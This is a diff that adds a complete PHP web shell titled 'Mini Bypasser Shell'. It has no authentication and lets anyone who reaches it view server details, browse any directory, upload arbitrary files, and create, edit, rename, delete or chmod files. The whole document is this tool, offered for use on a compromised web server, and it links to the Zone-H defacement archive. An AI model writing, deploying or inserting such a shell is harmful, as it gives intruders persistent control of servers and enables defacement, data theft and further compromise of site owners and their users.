@@ -1,0 +1,303 @@
+<?php
+function fsize($file) {
+    $a = ["B", "KB", "MB", "GB", "TB", "PB"];
+    $pos = 0;
+    $size = filesize($file);
+    while ($size >= 1024) {
+        $size /= 1024;
+        $pos++;
+    }
+    return round($size, 2) . " " . $a[$pos];
+}
+
+if (isset($_GET['dir'])) {
+    $path = $_GET['dir'];
+    chdir($path);
+} else {
+    $path = getcwd();
+}
+
+$path = str_replace('\\', '/', $path);
+$exdir = explode('/', $path);
+
+if (isset($_POST['uploadBtn'])) {
+    if (!empty($_FILES['fileUpload']['name'])) {
+        $uploadedFile = $_FILES['fileUpload'];
+        $newFilePath = $path . '/' . basename($uploadedFile['name']);
+
+        if (move_uploaded_file($uploadedFile['tmp_name'], $newFilePath)) {
+            $r = "<p><font color=\"green\">File Uploaded Successfully!</font></p>";
+        } else {
+            $r = "<p><font color=\"red\">File Upload Failed</font></p>";
+        }
+    } else {
+        echo "No file selected for upload.<br>";
+    }
+}
+
+if (isset($_POST['newFolderName'])) {
+    if (mkdir($path . '/' . $_POST['newFolderName'], 0777, true)) {
+        $r = "<p><font color=\"green\">Create Folder Successfully!</font></p>";
+    } else {
+        $r = "<p><font color=\"red\">Create Folder Failed</font></p>";
+    }
+}
+if (isset($_POST['newFileName']) && isset($_POST['newFileContent'])) {
+    if (file_put_contents($_POST['newFileName'], $_POST['newFileContent'])) {
+        $r = "<p><font color=\"green\">Create File Successfully!</font></p>";
+    } else {
+        $r = "<p><font color=\"red\">Create File Failed</font></p>";
+    }
+}
+
+if (isset($_POST['newName']) && isset($_GET['item'])) {
+    if ($_POST['newName'] == '') {
+        echo "You miss an important value";
+    }
+    if (rename($_GET['item'], $_POST['newName'])) {
+        $r = "<p><font color=\"green\">Rename Successfully!</font></p>";
+    } else {
+        $r = "<p><font color=\"red\">Rename Failed</font></p>";
+    }
+}
+if (isset($_POST['newContent']) && isset($_GET['item'])) {
+    if (file_put_contents($_GET['item'], $_POST['newContent'])) {
+        $r = "<p><font color=\"green\">Edit Successfully!</font></p>";
+    } else {
+        $r = "<p><font color=\"red\">Edit Failed</font></p>";
+    }
+}
+
+if (isset($_POST['newPerm']) && isset($_GET['item'])) {
+    if ($_POST['newPerm'] == '') {
+        echo "You miss an important value";
+    }
+    if (chmod($_GET['item'], octdec($_POST['newPerm']))) {
+        $r = "<p><font color=\"green\">Change Permission Successfully!</font></p>";
+    } else {
+        $r = "<p><font color=\"red\">Change Permission Failed</font></p>";
+    }
+}
+if (isset($_GET['action']) && $_GET['action'] == 'delete' && isset($_GET['item'])) {
+    if (is_dir($_GET['item'])) {
+        if (rmdir($_GET['item'])) {
+            $r = "<p><font color=\"green\">Delete Successfully!</font></p>";
+        } else {
+            $r = "<p><font color=\"red\">Delete Failed</font></p>";
+        }
+    } else {
+        if (unlink($_GET['item'])) {
+            $r = "<p><font color=\"green\">Delete Successfully!</font></p>";
+        } else {
+            $r = "<p><font color=\"red\">Delete Failed</font></p>";
+        }
+    }
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=0">
+  <title> Mini Byp4ss3r </title>
+  <style>
+   body {
+     margin: 0;
+     font-family: 'Courier New', Courier, monospace;
+     background-color: #08090a;
+            color: #c9d1d9;
+   }
+   .main {
+     max-width: 1350px;
+     margin: auto;
+     padding: 20px;
+   }
+   .webinfo {
+     text-align: center;
+     background-color: #161b22;
+     padding: 20px;
+     border-radius: 10px;
+     box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+   }
+   .webinfo h1 {
+     margin: 0;
+     font-size: 2em;
+   }
+  .webinfo p {
+     margin: 10px 0;
+     text-align: left;
+   }
+  .actions, .create {
+     margin: 20px 0;
+   }
+  .actions a, .create a, .fileup input, button {
+      margin: 5px;
+      padding: 10px 15px;
+      border: none;
+      border-radius: 5px;
+      background-color: #21262d;
+      color: #c9d1d9;
+      cursor: pointer;
+      text-decoration: none;
+      font-size: 1em;
+   }
+   
+  .actions a:hover, .create a:hover {
+      background-color: #30363d;
+   }
+  .webcontent {
+      background-color: #161b22;
+      border-radius: 10px;
+      padding: 20px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+   }
+  table {
+      width: 100%;
+      border-collapse: collapse
+  }
+  th, td {
+      padding: 10px;
+      border: 1px solid #30363d;
+   }
+  th {
+      background-color: #21262d;
+   }
+  td {
+      background-color: #161b22;
+   }
+   a {
+     text-decoration: none;
+     color:cyan;
+   }
+   .form-submitted {
+     display: none;
+   }
+   textarea {
+     background-color: #21262d;
+     color:white;
+   }
+   select {
+     padding:4px;
+     color:white;
+     background-color: #21262d;
+     border-radius:3px;
+   }
+  </style>
+</head>
+<body>
+  <div class="main">
+    <div class="webinfo">
+      <h1>Mini Bypasser Shell</h1>
+      <p>uname: <?= php_uname(); ?><br>
+         PHP: <?= phpversion(); ?><br>
+         Software: <?= $_SERVER['SERVER_SOFTWARE']; ?><br>
+         IP: <?= !@$_SERVER['SERVER_ADDR'] ? ($_SERVER['SERVER_NAME']) : @$_SERVER['SERVER_ADDR'] ?>
+         </p>
+      <p>Path: <?php
+        foreach ($exdir as $id => $pat) {
+          if ($pat == '' && $id == 0) {
+            echo '<a href="?dir=/">/</a>';
+            continue;
+          }
+          if ($pat == '') continue;
+          $pathUrl = implode('/', array_slice($exdir, 0, $id + 1));
+          echo '<a href="?dir=' . $pathUrl . '">' . $pat . '</a>/';
+        }
+      ?></p>
+    </div>
+    <div class="actions" align="center">
+      <a href="?tools=zoneh" >Zone-H Not Available </a>
+    </div>
+    <div class="fileup">
+      <?php $formSubmittedClass = (isset($_POST['newFolderName'])) ? 'form-submitted' : ''; if (isset($_GET['action']) && $_GET['action'] == 'createfolder') : ?>
+            <form method="post" style="text-align:center;" class="edit-form <?php echo $formSubmittedClass; ?>">
+                <label for="newFolderName">New Folder Name:</label>
+                <input type="text" name="newFolderName" required>
+                <button type="submit">Create Folder</button>
+            </form>
+            <?php endif; ?>
+      <?php $formSubmittedClass = (isset($_POST['newFileContent'])) ? 'form-submitted' : ''; if (isset($_GET['action']) && $_GET['action'] == 'createfile') : ?>
+            <form method="post" style="text-align:center;" class="edit-form <?php echo $formSubmittedClass; ?>">
+                <label for="newFileName">File Name:</label><br>
+                <input type="text" name="newFileName" required><br>
+                <label for="newFileContent">File Content:</label><br>
+                <textarea name="newFileContent" rows="20" cols="45"required></textarea><br>
+                <button type="submit">Create File</button>
+            </form>
+        <?php endif; ?>
+      <?php $formSubmittedClass = (isset($_POST['newName'])) ? 'form-submitted' : ''; if (isset($_GET['action']) && $_GET['action'] == 'rename' && isset($_GET['item'])) :
+        ?>
+            <form style="text-align:center;" method="post" class="edit-form <?php echo $formSubmittedClass; ?>">
+                <label for="newName">New Name:</label>
+                <input type="text" name="newName" value="<?= $_GET['item'] ?>" required>
+                <button type="submit">Submit</button>
+            </form>
+        <?php endif; ?>
+ <?php $formSubmittedClass = (isset($_POST['newContent'])) ? 'form-submitted' : ''; if ($_GET['action'] == 'edit' && isset($_GET['item'])) : ?>
+    <form action="" method="post" style="text-align:center;" class="edit-form <?php echo $formSubmittedClass; ?>">
+        <label for="newContent" style="font-size:30px;"><?= $_GET['item'] ?></label>
+        <br>
+        <textarea name="newContent" rows="20" cols="50" required><?= htmlspecialchars(file_get_contents($path . '/' . $_GET['item'])) ?></textarea><br>
+        <button type="submit">Submit</button>
+    </form>
+      <?php endif; ?>
+      <?php $formSubmittedClass = (isset($_POST['newPerm'])) ? 'form-submitted' : ''; if ($_GET['action'] == 'chmod' && isset($_GET['item'])) : ?>
+            <form style="text-align:center;" method="post" class="edit-form <?php echo $formSubmittedClass; ?>">
+                <label for="newPerm"><?= $_GET['item'] ?></label><br>
+                <input type="text" name="newPerm" value="<?= substr(sprintf('%o', fileperms($path . '/' . $_GET['item'])), -4) ?>" required><br>
+                <button type="submit">Submit</button>
+            </form>
+        <?php endif; ?>
+      <form method="post" enctype="multipart/form-data">
+        <input type="file" name="fileUpload" id="fileUpload" required>
+        <button type="submit" name="uploadBtn">Upload</button>
+      </form>
+    </div>
+    <div class="create">
+      <a href="?dir=<?= $path ?>&action=createfile">[ New File ]</a> 
+      <a href="?dir=<?= $path ?>&action=createfolder">[ New Folder ]</a>
+    </div>
+    <div class="result" style="text-align:center;">
+      <?php echo $r; ?>
+    </div>
+    <div class="webcontent">
+      <table>
+        <thead>
+          <tr>
+            <th>Name</th>
+            <th>Type</th>
+            <th>Size</th>
+            <th>Permission</th>
+            <th>Date</th>
+            <th>Action</th>
+          </tr>
+        </thead>
+        <tbody>
+        <?php
+        $dirs = scandir($path);
+        foreach ($dirs as $dir) {
+          if ($dir != '.' && $dir != '..') {
+            echo "<tr>";
+            echo "<td><a href=\"?dir={$path}/{$dir}\">{$dir}</a></td>";
+            echo "<td style='text-align:center;'>" . mime_content_type($dir) . "</td>";
+            echo "<td style='text-align:center;'>" . fsize($dir) . "</td>";
+            echo "<td style='text-align:center;'>" . substr(sprintf('%o', fileperms($dir)), -4) . "</td>";
+            echo "<td style='text-align:center;'>" . date("Y-m-d H:i:s", filemtime($path . '/' . $dir)) . "</td>";
+            echo "<td style='text-align:center;'><select onchange=\"location = this.value;\">
+            <option value=\"#\">Menu</option>
+            <option value=\"?dir={$path}&action=edit&item={$dir}\">Edit</option>
+            <option value=\"?dir={$path}&action=rename&item={$dir}\">Rename</option>
+            <option value=\"?dir={$path}&action=delete&item={$dir}\">Delete</option>
+            <option value=\"?dir={$path}&action=chmod&item={$dir}\">Chmod</option>
+           </select></td>";
+           echo "</tr>";
+          }
+        }
+        ?>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</body>
+</html>
